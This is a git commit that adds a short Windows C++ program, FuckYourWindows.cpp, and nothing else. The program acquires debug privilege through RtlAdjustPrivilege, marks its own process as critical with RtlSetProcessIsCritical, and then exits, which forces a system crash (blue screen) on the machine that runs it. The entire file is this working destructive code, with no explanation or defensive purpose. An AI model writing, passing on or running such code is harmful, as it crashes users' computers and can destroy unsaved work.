b20d271acb42dc02baa47cd4abed79c13943934d
yqs112358 <yqs112358@outlook.com>
2022-11-30 10:05:42 +0800

    initial code

---
+++ FuckYourWindows.cpp
@@ -0,0 +1,18 @@
+﻿#include <windows.h>
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+{
+    typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
+    typedef BOOL(WINAPI* RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
+    RtlAdjustPrivilege AdjustPrivilege;
+    RtlSetProcessIsCritical SetCriticalProcess;
+
+    HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
+    AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
+    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
+    BOOLEAN b;
+
+    AdjustPrivilege(20UL, TRUE, FALSE, &b);
+    SetCriticalProcess(TRUE, NULL, FALSE);
+    return 0;
+}
